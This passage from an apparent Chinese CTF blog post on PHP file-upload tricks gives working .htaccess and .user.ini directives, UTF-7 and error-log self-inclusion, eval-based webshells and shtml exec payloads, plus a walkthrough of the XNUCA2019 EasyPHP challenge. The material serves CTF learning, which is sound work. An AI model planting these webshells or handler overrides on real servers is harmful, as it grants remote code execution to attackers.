+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt</span><br><span class="line"></span><br><span class="line">AddHandler php7-script .txt</span><br></pre></td></tr></table></figure>
+<h5><span id="cgi脚本执行"> cgi脚本执行</span></h5>
+<p>如果开启了cgi拓展(需要加载<code>cgi_module</code>，也就是<code>.conf文件中有 LoadModule cgi_module modules/mod_cgi.so</code>)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI #允许CGI执行</span><br><span class="line">AddHandler cgi-script .sh</span><br><span class="line">#此处当然可以直接SetHandler cgi-script 强制解析成cgi</span><br></pre></td></tr></table></figure>
+<p>写个.sh的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo &quot;Content-Type: text/plain&quot;</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">cat /flag</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
+<h5><span id="fastcgi执行"> FastCgi执行</span></h5>
+<p>需要加载<code>mod_fcgid.so</code></p>
+<p>也就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule fcgid_module modules/mod_fcgid.so</span><br></pre></td></tr></table></figure>
+<p>开启后，在<code>.htaccess</code>上写一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">#SetHandler fcgid-script</span><br><span class="line">AddHandler fcgid-script .txt</span><br><span class="line">FcgidWrapper &quot;/bin/ls /&quot; .txt</span><br></pre></td></tr></table></figure>
+<p>传一个随意的.txt</p>
+<h5><span id="lua执行"> lua执行</span></h5>
+<p>新姿势，在2020年<code>newupload</code>中被使用</p>
+<p>利用<code>.htaccess</code>将文件解析成<code>.lua</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler lua-script .lua</span><br></pre></td></tr></table></figure>
+<p>然后传一个<code>1.lua</code>：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">&quot;string&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(r)</span></span></span><br><span class="line">    r.content_type = <span class="string">&quot;text/plain&quot;</span></span><br><span class="line">    <span class="keyword">local</span> t = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&#x27;/readflag&#x27;</span>)</span><br><span class="line">    <span class="keyword">local</span> a = t:<span class="built_in">read</span>(<span class="string">&quot;*all&quot;</span>)</span><br><span class="line">    r:puts(a)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.method == <span class="string">&#x27;GET&#x27;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">pairs</span>( r:parseargs() ) <span class="keyword">do</span></span><br><span class="line">            r:puts( <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%s: %s\n&quot;</span>, k, v) )</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        r:puts(<span class="string">&quot;Unsupported HTTP method &quot;</span> .. r.method)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5><span id="自包含绕过lt"> 自包含绕过&lt;?</span></h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4</span><br><span class="line">#+ADw?php phpinfo()+Ads</span><br></pre></td></tr></table></figure>
+<p>utf7编码可以利用下面方式得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;php://filter/write=convert.iconv.utf-8.utf-7/resource=1.txt&quot;</span>; <span class="comment">//utf-16le编码写入文件</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="string">&quot;&lt;?php eval(\$_GET[\&#x27;cmd\&#x27;]); ?&gt;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(cat <span class="number">1</span>.txt);</span><br><span class="line"><span class="comment">//+ADw?php eval(+ACQAXw-GET+AFsAXA&#x27;cmd+AFw&#x27;+AF0)+ADs ?+AD4-</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;php://filter/write=convert.iconv.utf-8.utf-7/resource=1.txt&quot;</span>; <span class="comment">//utf-16le编码写入文件</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat 1.txt&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#+ADw?php phpinfo()+ADs?+AD4-</span></span><br></pre></td></tr></table></figure>
+<h5><span id="利用报错日志写"> 利用报错日志写🐎</span></h5>
+<p>例如<code>[XNUCA2019Qualifier]EasyPHP</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span>!==<span class="string">&quot;index.php&quot;</span>)&#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">include_once</span>(<span class="string">&quot;fl3g.php&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])||!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="string">&#x27;file&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span>!==<span class="string">&quot;index.php&quot;</span>)&#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>.<span class="string">&quot;\nJust one chance&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这题对文件的内容和文件名做出了限制，同时在结尾添加了<code>\nJust one chance</code></p>
+<p>这里可以利用<code>.htaccess</code>进行自包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_fi\</span><br><span class="line">le .htaccess</span><br><span class="line">#&lt;?php system(&#x27;cat /f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<p>url编码后传进去即可</p>
+<p>另一种解法是利用题目中<code>preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1</code>，这里可以利用回溯限制绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure>
+<p>然后即可绕过<code>preg_match</code>，就可以利用php伪协议写shell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = PD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</span><br></pre></td></tr></table></figure>
+<p>当然，由于其包含了<code>fl3g.php</code></p>
+<p>如果我们修改<code>include_path</code>，就可以使得<code>fl3g.php</code>是任意目录下的某个文件</p>
+<p>利用<code>error_log</code>可以控制<code>fl3g.php</code>的内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path <span class="string">&quot;/tmp/xx/+ADw?php die(eval(<span class="subst">$_GET</span>[1]))+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span></span><br><span class="line">php_value error_reporting <span class="number">32767</span> <span class="comment">#设置报告等级</span></span><br><span class="line">php_value error_log /tmp/fl3g.php <span class="comment">#将错误日志写入/tmp/fl3g</span></span><br><span class="line"><span class="comment"># \</span></span><br></pre></td></tr></table></figure>
+<p>如果我们<code>include_path</code>修改后，include_once就会去<code>include</code>到这个不存在的文件夹，此时产生报错，报错内容写入了<code>/tmp/fl3g.php</code>内</p>
+<p>这里的<code>#\</code>是注释后面的脏数据</p>
+<p>此时访问<code>index.php</code>后触发错误，将内容写入后再次修改<code>.htaccess</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">php_value include_path &quot;/tmp&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>
+<p>此时再次访问index.php，便会包含<code>/tmp</code>下的已经写入的木马</p>
+<p>传入<code>1=whoami</code>即可</p>
+<h5><span id="绕过exif_imagetype上传htaccess"> 绕过exif_imagetype()上传.htaccess</span></h5>
+<p>假设题目限制了上传文件的图片尺寸：</p>
+<p>假设利用<code>getimagesize()</code>等函数检测上传图片的尺寸，并且使用<code>exif_imagetype()</code>检查图片类型，此时我们可以使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define width 20</span><br><span class="line">#define height 10</span><br><span class="line">xxxxxx</span><br></pre></td></tr></table></figure>
+<p>来绕过</p>
+<h5><span id="源码泄露"> 源码泄露</span></h5>
+<p>前文说到，设置 engine值为0时会关闭源码解析，导致源码泄露：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine 0</span><br></pre></td></tr></table></figure>
+<h5><span id="反序列化触发"> 反序列化触发</span></h5>
+<p>php文件中发生反序列化时触发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value unserialize_callback_func &quot;phpinfo&quot;</span><br></pre></td></tr></table></figure>
+<h5><span id="shtml"> shtml</span></h5>
+<p>将<code>.htaccess</code>设置成利用<code>shtml</code>进行解析也可以进行rce:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddType text/html .shtml</span><br><span class="line">AddHandler server-parsed .shtml</span><br><span class="line">Options Includes</span><br></pre></td></tr></table></figure>
+<p><code>shell.shtml</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3><span id="userini"> .user.ini</span></h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = shell.jpg</span><br><span class="line">autp_append_file = shell.png</span><br></pre></td></tr></table></figure>
+<h3><span id="inc"> inc</span></h3>
+<p>利用<code>spl_autoload_register</code>函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spl_autoload_register(&#x27;xx&#x27;);</span><br><span class="line">当下面有不存在的类时会调用该xx方法</span><br></pre></td></tr></table></figure>
+<p>如果不指定处理用的函数，就会自动包含类名.php或者类名.inc的文件</p>
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/posts/11796.html",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/posts/11796.html";
+            const title         = "「文件上传」";
+            const excerpt       = `有关php文件上传的一些特性`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" rel="tag">基础漏洞</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2023-10-31T10:45:48.229Z" itemprop="dateModified">最后编辑：2023-10-31</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" php伪协议" href="/posts/3072.html">&lt; 上一篇</a>
+            </div>
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" Phar反序列化" href="/posts/42785.html">下一篇 &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
+        <div id="v-comments" class="post-comments bg-image"></div>
+<script>
+    var load_comm = () => {
+        const init = () => {
+            new Valine({
+                el: '#v-comments',
+                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
+                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
+                visitor: true,
+                enableQQ: false,
+                path: '/posts/11796.html'
+                
+            });
+        }
+        if (typeof Valine === 'undefined') {
+            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
+            $.getScript(src, init);
+        } else {
+            init();
+        }
+    };
+</script>
+
+
+<script>
+<style>
+    .v .veditor{min-height: 10rem;
+        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: right;
+        background-color: rgba(255,255,255,0);
+        resize: none;}
+</style>
+</script>
+
+
+    <script>
+        new Valine({
+            el: '#vcomments',
+            lang: 'zh-cn',
+            admin_email: '83635877@qq.com',//博主邮箱
+            appId: "",
+            appKey: "",
+            path: window.location.pathname,
+            comment_count: true,
+            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
+            //verify: true, //验证码
+            avatar: 'monsterid',//小怪物头像
+            placeholder: "qwq~"
+        });
+        
+</script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script type="text/javascript">
+        jinrishici.load(function(result) {
+            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
+            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
+        })
+    </script>
+
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>
+
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+        <script src="./js/src/Valine.min.js"></script>   
+        
+        
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/Oscar.jpg" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                30
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                9
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                9
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><span class="category-list-count">3</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Misc/" style="font-size: 0.6em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.7em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.7em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.75em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.65em;">基础漏洞</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/posts/42785.html"><i class="fa  fa-book"></i> Phar反序列化</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/11796.html"><i class="fa  fa-book"></i> 文件上传</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/3072.html"><i class="fa  fa-book"></i> php伪协议</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/42279.html"><i class="fa  fa-book"></i> 看看ssti</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/10145.html"><i class="fa  fa-book"></i> 羊城杯的一些题解及体会</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://twitter.com/Err0r2333"><i class="fa fa-twitter"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2023 Err0r233 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                        <div id="binft"></div>
+  <script>
+    var binft = function (r) {
+      function t() {
+        return b[Math.floor(Math.random() * b.length)]
+      }  
+      function e() {
+        return String.fromCharCode(94 * Math.random() + 33)
+      }
+      function n(r) {
+        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
+          var l = document.createElement("span");
+          l.textContent = e(), l.style.color = t(), n.appendChild(l)
+        }
+        return n
+      }
+      function i() {
+        var t = o[c.skillI];
